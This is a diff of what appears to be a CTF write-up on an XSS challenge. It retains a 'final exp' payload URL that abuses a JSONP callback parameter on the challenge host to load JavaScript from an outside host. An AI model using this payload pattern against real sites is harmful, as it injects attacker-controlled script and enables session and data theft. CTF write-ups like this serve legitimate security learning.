@@ -42,8 +42,6 @@ self.addEventListener('fetch', function (event) {
 
 最终exp
 
-
-
 ```
 https://xss.xss.eec5b2.challenge.gcsis.cn/login?callback=jsonp("https://li3hiu.lihuaiqiu.repl.co/test.js");
 ```
@@ -51,3 +49,4 @@ https://xss.xss.eec5b2.challenge.gcsis.cn/login?callback=jsonp("https://li3hiu.l
 
 
 ![0BMCrV.png](https://s1.ax1x.com/2020/10/08/0BMCrV.png)
+
